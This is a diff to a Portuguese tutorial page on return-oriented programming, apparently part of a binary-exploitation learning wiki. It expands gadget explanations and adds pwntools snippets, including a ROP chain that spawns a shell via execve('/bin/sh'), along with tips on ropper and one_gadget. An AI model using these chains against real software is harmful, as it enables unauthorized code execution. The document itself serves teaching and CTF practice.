@@ -65,11 +65,13 @@ pop rdx; ret          # Coloca valor no RDX (3º argumento)
 pop rax; ret          # Coloca valor no RAX (syscall number)
 
 # x86 (32-bit)
-pop eax; ret          # Coloca valor no EAX
-pop ebx; ret          # 1º argumento
-pop ecx; ret          # 2º argumento
-pop edx; ret          # 3º argumento
+pop eax; ret          # Coloca valor no EAX (syscall number)
+pop ebx; ret          # 1º argumento de syscall (int 0x80)
+pop ecx; ret          # 2º argumento de syscall
+pop edx; ret          # 3º argumento de syscall
 ```
+
+Em 32 bits, os argumentos de **funções** vão pela stack, então não precisamos de gadgets `pop` para chamá-las: basta colocar `[função][endereço de retorno][arg1][arg2]...` na stack. Os `pop` são usados para preparar syscalls (`int 0x80`) ou para limpar os argumentos da stack entre duas chamadas (`pop ebx; pop esi; ret` para 2 argumentos, por exemplo).
 
 Exemplo chamando `write(1, buf, 100)` no `pwntools`:
 
@@ -80,17 +82,19 @@ payload += p64(pop_rdx) + p64(100)    # count
 payload += p64(write_addr)            # chamar write
 ```
 
-### Gadgets com múltiplos pop_rsi
+### Gadgets com múltiplos pops
 
-Úteis para limpar a stack ou configurar múltiplos registradores.
+Úteis para limpar a stack ou configurar múltiplos registradores de uma vez. Cada `pop` consome 8 bytes da stack, então para cada `pop` do gadget colocamos um valor na chain (mesmo que seja lixo).
 
 ```
 # Exemplo típico encontrado em libc
 pop rdi; pop rsi; pop rdx; ret
 
-# Ou com registradores extras
+# Ou com registradores extras (o fim da __libc_csu_init, presente em quase todo binário compilado com glibc < 2.34)
 pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
 ```
+
+Um detalhe sobre `pop rdx`: ele é raro em binários pequenos. Costuma ser necessário pegá-lo na libc (`pop rdx; pop rbx; ret` ou `pop rdx; pop r12; ret`, dependendo da versão) depois de vazar a base dela.
 
 ### Load/Store (memória)
 
@@ -130,8 +134,21 @@ syscall; ret
 int 0x80; ret
 
 # Preparar syscall
-mov eax, 0x3b; syscall; ret  # execve syscall number
+pop rax; ret                 # rax = número da syscall (ex: 0x3b = execve)
+syscall; ret                 # faz a syscall e continua a chain
 ```
+
+Exemplo de `execve("/bin/sh", 0, 0)` com gadgets (precisa de um `/bin/sh` em memória e de `pop rdi`, `pop rsi`, `pop rdx`, `pop rax` e `syscall`):
+
+```py
+payload += p64(pop_rdi) + p64(bin_sh)
+payload += p64(pop_rsi) + p64(0)
+payload += p64(pop_rdx) + p64(0)
+payload += p64(pop_rax) + p64(59)
+payload += p64(syscall)
+```
+
+Se não houver gadgets suficientes, veja [SIGROP](./sigrop.mdx).
 
 ### Stack pivoting
 
@@ -189,7 +206,8 @@ libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Carregar libc (ajustar caminho)
 rop = ROP(elf)
 
 # Gadgets úteis (Se não encontrar, buscar manualmente)
-pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] # Retorna endereço do gadget (cuidado, pode dar indexError se não existir. Faça if pop_rdi: pop_rdi = pop_rdi[0]
+# find_gadget retorna None se o gadget não existir, então o [0] daria erro. Confira antes.
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] # [0] retorna o endereço do gadget
 pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
 pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
 ret = rop.find_gadget(['ret'])[0]
@@ -200,13 +218,17 @@ payload += p64(pop_rdi)
 payload += p64(hello)           # puts("Hello World!") (hello = endereço da string)
 payload += p64(elf.plt['puts']) # Chama função puts pela tabela PLT que existe no binário
 
-# Método mais simples do pwntools
-rop.raw(b'A' * padding)  # Padding primeiro
-rop.call('puts', [hello])  # Adiciona chamada com função
-rop.call('main')  # Adiciona retorno
+# Método mais simples do pwntools: ele acha os gadgets sozinho
+rop = ROP(elf)
+rop.call('puts', [hello])  # Adiciona chamada com função (resolve puts@plt e pop rdi automaticamente)
+rop.call('main')  # Volta para a main depois (útil para fazer um segundo estágio)
 print(rop.dump()) # Visualizar chain
-payload = rop.chain()
+payload = b'A' * padding + rop.chain()
 ```
+
+Para a stack ficar alinhada ao chamar funções da libc como `system`, lembre-se do gadget `ret` extra (veja [Desalinhamento de Stack](../buffer-overflow/return-address.md#cuidado-ao-sobrescrever-return-address-desalinhamento-de-stack)).
+
+Outra ferramenta comum é o [ropper](https://github.com/sashs/Ropper) (`ropper --file ./programa --search "pop rdi"`). E, para gadgets `syscall`, o `one_gadget` (`one_gadget libc.so.6`) acha endereços na libc que abrem um shell diretamente, sem precisar de argumentos, desde que certas condições sobre registradores sejam satisfeitas.
 
 ## Fazendo um ataque ROP
 
